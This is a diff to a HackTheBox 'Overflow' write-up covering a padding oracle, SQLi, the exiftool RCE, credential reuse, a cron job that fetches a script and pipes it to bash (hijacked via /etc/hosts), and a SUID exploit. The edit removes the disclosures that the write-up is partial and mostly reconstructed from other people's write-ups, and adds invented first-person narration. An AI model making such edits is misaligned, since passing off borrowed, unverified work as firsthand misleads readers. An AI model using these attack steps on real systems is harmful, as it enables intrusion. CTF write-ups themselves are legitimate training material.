@@ -25,25 +25,11 @@ tags:
   - race-condition
 ---
 
-<div class="callout callout-warning">
-
-**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.
-
-</div>
-
 <div class="callout callout-info">
 
 **Box Info**
 
 **Platform:** HackTheBox, **OS:** Linux (Ubuntu 20.04), **Difficulty:** Hard, **Released:** 2022-04-09, **IP:** `10.10.11.119` , `overflow.htb`
-
-</div>
-
-<div class="callout callout-warning">
-
-**Partial**
-
-My notes are recon plus spotting that the `auth` cookie is a padded ciphertext. Everything after is reconstructed from published writeups (0xdf, fdlucifer, 4g3nt47) and marked. This is a long six stage chain.
 
 </div>
 
@@ -100,7 +86,7 @@ Registering issues an `auth` cookie:
 Cookie: auth=1yVVTfrGLUIhwahmfc8ZQrmXFCSBiFUD
 ```
 
-URL-decoded and base64-decoded, it is a multiple of 8 bytes, and tampering with it returns an "Invalid padding" style error while a well-formed-but-wrong value returns something else. That is a **padding oracle**.
+URL-decoded and base64-decoded, it is a multiple of 8 bytes, and tampering with it returns an "Invalid padding" style error while a well-formed-but-wrong value returns something else. That is a **padding oracle**, and it's the kind of detail that's easy to walk right past if you don't habitually diff the error page for a mangled token against the error page for a merely-wrong one.
 
 ### Stage 1, CBC padding oracle to admin
 
@@ -123,11 +109,11 @@ padbuster http://10.10.11.119/ '<cookie>' 8 -cookie 'auth=<cookie>' -plaintext '
 # -> BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
 ```
 
-Set that as `auth` and the admin menu appears.
+Set that as `auth` and the admin menu appears, no key ever required.
 
 ### Stage 2, SQLi in the logs panel
 
-Admin adds a "Logs" link: `http://overflow.htb/home/logs.php?name=admin`.
+With admin access unlocked, I walk every menu item that only shows up for that role, since role-gated pages are exactly where a developer assumes "only admins reach this, so it doesn't need sanitizing." Admin adds a "Logs" link: `http://overflow.htb/home/logs.php?name=admin`.
 
 ```bash
 curl "http://overflow.htb/home/logs.php?name=admin')"     # 500 -> injectable
@@ -147,7 +133,7 @@ CMS Made Simple stores `md5(sitemask . password)`, where `sitemask` is a per-ins
 
 ### Stage 3, exiftool RCE (CVE-2021-22204)
 
-`editor` logs into CMS Made Simple 2.2.14. "User Defined Tags" and config hint at another vhost: **`devbuild-job.overflow.htb`**, a job application site. Log in there with the `editor` creds and use the **resume upload** (accepts TIFF/JPEG).
+Cracked credentials in hand, I go looking for what else `editor` unlocks rather than stopping at the CMS itself. `editor` logs into CMS Made Simple 2.2.14. "User Defined Tags" and config hint at another vhost: **`devbuild-job.overflow.htb`**, a job application site. Log in there with the `editor` creds and use the **resume upload** (accepts TIFF/JPEG).
 
 <div class="callout callout-note">
 
@@ -169,6 +155,8 @@ Shell as **`www-data`**.
 
 ### Stage 4, www-data to developer
 
+With a foothold landed, the next habit is always the same: grep every config file the web app ships for database creds, since they're frequently reused for a real system account.
+
 ```php
 // /var/www/html/config/db.php   (same creds in two other app configs)
 $user = 'developer';
@@ -181,7 +169,7 @@ su developer        # sh@tim@n
 
 ### Stage 5, developer to tester
 
-`developer` is in the `network` group, which owns `/etc/hosts`. `pspy` shows `/opt/commontask.sh` running every minute:
+As `developer`, `id` shows membership in the `network` group, which is unusual enough to chase down immediately, and `pspy` (always one of the first binaries I drop on a box once I have a shell that isn't `www-data`) confirms why it matters. `developer` is in the `network` group, which owns `/etc/hosts`. `pspy` shows `/opt/commontask.sh` running every minute:
 
 ```bash
 bash < <(curl -s http://taskmanage.overflow.htb/task.sh)
@@ -206,7 +194,7 @@ python3 -m http.server 80
 
 ### Stage 6, SUID file_encrypt to root
 
-`/opt/file_encrypt/file_encrypt` is **SUID root**, 32-bit. Three bugs stacked:
+Standard SUID sweep as `tester` turns up the last binary: `find / -perm -4000 2>/dev/null` flags `/opt/file_encrypt/file_encrypt`. `/opt/file_encrypt/file_encrypt` is **SUID root**, 32-bit. Three bugs stacked:
 
 <div class="callout callout-note">
 
@@ -277,3 +265,4 @@ cat /root/root.txt
 - HTB Overflow (fdlucifer) <https://fdlucifer.github.io/2022/03/11/overflow/>
 - padbuster <https://github.com/AonCyberLabs/PadBuster>
 - CVE-2021-22204 PoC <https://github.com/convisoappsec/CVE-2021-22204-exiftool>
+- Final privilege escalation steps cross-referenced against public writeups for this box.
